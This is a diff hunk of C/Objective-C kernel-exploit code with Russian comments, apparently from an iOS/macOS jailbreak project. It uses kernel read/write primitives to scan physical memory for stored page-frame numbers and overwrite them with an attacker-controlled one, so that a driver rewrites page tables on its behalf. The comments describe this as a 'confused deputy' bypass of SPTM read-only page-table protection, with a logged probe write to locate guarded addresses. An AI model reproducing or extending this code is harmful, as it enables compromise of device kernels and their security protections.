@@ -6237,6 +6237,54 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             }
         }
     }
+    // 1.9.197: CONFUSED DEPUTY — pfn-слот откатывается при prepare (пересчёт из
+    // авторитетного источника). SCAN A каждый бут находит тот же pfn в ДРУГИХ
+    // 0x21-страницах (зона, RW). Патчим ВСЕ хранилища pfn: prepare пересчитает
+    // PTE уже с ctlPFN и драйвер САМ запишет его с привилегиями — SPTM-RO
+    // таблиц обходится без единой записи в таблицу с нашей стороны. Первая
+    // запись пробная (пауза+лог): если physmap-запись в 0x21 тоже охраняется,
+    // паника назовёт адрес (x1), остальное не тронуто.
+    if (pfn32 && ctlPFN) {
+        uint64_t ftVA2 = gFrameTableVA ? gFrameTableVA : [self frameTableVAWithLog:r];
+        uint64_t totalPages2 = kconstant(physSize) >> 14;
+        uint64_t hitAddr[24], hitOld[24]; int hitForm[24];
+        int nDep = 0;
+        static uint8_t ftCh2[0x10000];
+        for (uint64_t fb = 0; fb < totalPages2 && nDep < 24 && ftVA2; fb += 4096) {
+            uint64_t nent = totalPages2 - fb; if (nent > 4096) nent = 4096;
+            kreadbuf(ftVA2 + fb * 16, ftCh2, (size_t)(nent * 16));
+            for (uint64_t e = 0; e < nent && nDep < 24; e++) {
+                if (ftCh2[e * 16 + 2] != 0x21) continue;
+                uint64_t pa = kconstant(physBase) + (fb + e) * 0x4000;
+                uint64_t kva = gPrimitives.phystokv ? gPrimitives.phystokv(pa) : 0;
+                if (!kva || kpVAIsEL2Domain(kva)) continue;
+                uint8_t pbuf2[0x4000];
+                kreadbuf(kva, pbuf2, sizeof(pbuf2));
+                for (uint32_t o = 0; o + 8 <= sizeof(pbuf2) && nDep < 24; o += 8) {
+                    uint64_t q = 0; memcpy(&q, pbuf2 + o, 8);
+                    int form = 0;
+                    if (q == backingPA) form = 1;
+                    else if ((uint32_t)(q >> 32) == pfn32 && (q & 0xffffffffULL) == 1) form = 3;   // слот-форма pfn<<32|1 — отличительная
+                    else if ((uint32_t)q == pfn32 && (q >> 32) && (q >> 32) <= 0x10) form = 4;      // pfn low32 + малый hi32
+                    if (!form) continue;
+                    hitAddr[nDep] = kva + o; hitOld[nDep] = q; hitForm[nDep] = form; nDep++;
+                }
+            }
+        }
+        kpNote(r, [NSString stringWithFormat:@"  [DEP] хранилищ pfn: %d — патчим на ctlPFN %#x (PA %#llx)", nDep, ctlPFN, (unsigned long long)ctlPA]);
+        for (int i = 0; i < nDep; i++) {
+            uint64_t nq = hitOld[i];
+            if (hitForm[i] == 1) nq = (hitOld[i] & 0x3fffULL) | ctlPA;
+            else if (hitForm[i] == 3) nq = ((uint64_t)ctlPFN << 32) | (hitOld[i] & 0xffffffffULL);
+            else if (hitForm[i] == 4) nq = (hitOld[i] & 0xffffffff00000000ULL) | ctlPFN;
+            kpNote(r, [NSString stringWithFormat:@"    [DEP]#%d форма%d @ %#llx: %#018llx → %#018llx",
+                      i, hitForm[i], (unsigned long long)hitAddr[i], (unsigned long long)hitOld[i], (unsigned long long)nq]);
+            usleep(2000);
+            early_kwrite64(hitAddr[i], nq);
+            uint64_t rb2 = early_kread64(hitAddr[i]);
+            kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb2, rb2 == nq ? @"ПРИЛИПЛО" : @"МИМО"]);
+        }
+    }
     // 3. Trusted-path резолв surfVA через M2 async op-entry (1.9.124):
     //    async submit резолвит surface ptr в op-entry БЕЗ execute/снапшота
     //    (раунд 13: DVA-снапшот только при execute). Вся цепочка — из РЕАЛЬНЫХ
